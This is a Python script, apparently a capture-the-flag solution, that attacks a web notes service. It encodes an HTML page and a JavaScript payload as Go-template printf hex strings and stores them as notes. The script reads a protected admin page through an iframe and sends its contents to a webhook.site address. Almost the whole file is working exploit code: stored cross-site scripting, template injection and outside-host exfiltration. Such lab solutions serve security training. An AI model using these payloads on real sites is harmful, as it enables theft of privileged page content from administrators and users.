import requests

baseurl = "127.0.0.1:1337"

# Javascript Payload
script = f"""
document.getElementById('f').onload = function() {{
    let flag = document.getElementById("f").contentWindow.document.body.innerText;
    document.body.innerHTML = '<a href="https://webhook.site/<REDACTED>?flag=' + encodeURIComponent(flag) + '">Click me</a>';
    document.getElementsByTagName('a')[0].click();
}};
"""

# HTML Payload
html = f"""
<html>
<head>
    <title>Mooohahaha</title>
</head>
<body>
    <iframe src="http://{baseurl}/admin/flag" id="f"></iframe>
    <script src="SCRIPTURL"></script>
    <a href="URL" id="c">Click me</a>
</body>
</html>
"""

# Make the printf payload with hex and submit the note to get the UUID
def genPayload(data):
    # Make payload hex
    data_hex = '0x' + ' 0x'.join([hex(ord(c))[2:] for c in data])
    number_of_hex = len(data_hex.split(' '))
    printf_formatting = "%c"*number_of_hex

    payload = f"{{{{printf `{printf_formatting}` {data_hex}}}}}"
    
    url = f"http://ctf.wackattack.eu:5028/notes"
    response = requests.post(url, data={"data": payload})

    return response.url.split('/')[-1]


# Print out the UUID's for the script and the html
uuid = genPayload(script)
print(f"SCRIPT: {uuid}")
uuid = genPayload(html.replace("SCRIPTURL", f"http://{baseurl}/notes/{uuid}"))
print(f"HTML: {uuid}")